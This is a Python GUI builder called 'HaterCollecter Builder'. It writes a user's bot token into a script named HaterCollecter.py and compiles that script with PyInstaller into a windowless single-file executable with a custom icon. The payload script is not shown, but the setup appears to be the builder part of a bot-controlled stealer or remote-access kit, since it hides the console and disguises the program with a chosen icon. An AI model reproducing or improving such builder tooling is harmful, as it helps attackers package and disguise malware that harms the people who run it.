import tkinter as tk
from tkinter import filedialog, messagebox
import customtkinter as ctk
import json
import subprocess
from time import sleep
import os

def write_token(user_token):
    with open("config.json", "r") as config:
        data = json.load(config)
        data["token"] = user_token
        with open('config.json', 'w') as f:
            json.dump(data, f, indent=4)
    messagebox.showinfo("Success", "Token Saved Successfully in config.json!")

def take_token():
    with open("config.json", "r") as token:
        data = json.load(token)
        return data["token"]

def write_to_hater(token):
    with open("HaterCollecter.py", "rb") as hater_content:
        hater_data = hater_content.read()
    if f'token = "{token}"'.encode("utf-8") in hater_data and "bot.run(token)".encode("utf-8") in hater_data:
        messagebox.showerror("Error", "Already Saved in HaterCollecter.py")
    else:
        with open("HaterCollecter.py", "a") as hater:
            hater.write(f'\ntoken = "{token}"\nbot.run(token)')
            messagebox.showinfo("Success", "Saved in HaterCollecter.py")



def build_file(ico_file):
    status_label.configure(text="Building...")
    app.update_idletasks()
    cmd = ['pyinstaller', '--onefile', 'HaterCollecter.py', '--windowed', f'--icon={ico_file}']
    subprocess.run(cmd, check=True)
    os.system("clear || cls")
    sleep(0.5)
    messagebox.showinfo("Success", "Created HaterCollecter.exe in /Dist")
    app.after(3000, clear_status)

def clear_status():
    status_label.configure(text="")

def save_token():
    user_token = token_entry.get()
    if user_token == "":
        messagebox.showerror("Error","Enter Token.")
        return False
    else:
        write_token(user_token=user_token)
        write_to_hater(token=user_token)

def create_exe():
    while True:
        if save_token() == False:
            break
        else:
            ico_file = filedialog.askopenfilename(title="Select Icon File", filetypes=(("ICO Files", "*.ico"),))
            if ico_file:
                build_file(ico_file=ico_file)
                break
            else:
                messagebox.showerror("Error","Please Select an ICO file.")
                break

app = tk.Tk()
app.iconbitmap("fav.ico")
app.title("HaterCollecter Builder")
app.geometry("600x500")

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")
app.configure(bg="#060606")

frame = ctk.CTkFrame(master=app, corner_radius=15)
frame.pack(pady=20, padx=10, fill="both", expand=True)

ogiv = ctk.CTkLabel(master=frame, text="HaterCollecter", font=("Sans", 14, "bold"))
ogiv.pack(pady=50, padx=50)

label = ctk.CTkLabel(master=frame, text="Enter Your Bot Token", font=("Arial", 14, "bold"))
label.pack(pady=12, padx=10)

token_entry = ctk.CTkEntry(master=frame, width=250, height=30, font=("Arial", 12))
token_entry.pack(pady=12, padx=10)

build_button = ctk.CTkButton(master=frame, text="Build EXE", command=create_exe, width=200, height=40, font=("Arial", 12, "bold"), fg_color="#c50000", hover_color="#900c27")
build_button.pack(pady=12, padx=10)

status_label = ctk.CTkLabel(master=frame, text="", font=("Arial", 12, "italic"))
status_label.pack(pady=12, padx=10)

window_width = 600
window_height = 500

screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()

center_x = int(screen_width / 2 - window_width / 2)
center_y = int(screen_height / 2 - window_height / 2)

app.geometry(f"{window_width}x{window_height}+{center_x}+{center_y}")

app.mainloop()
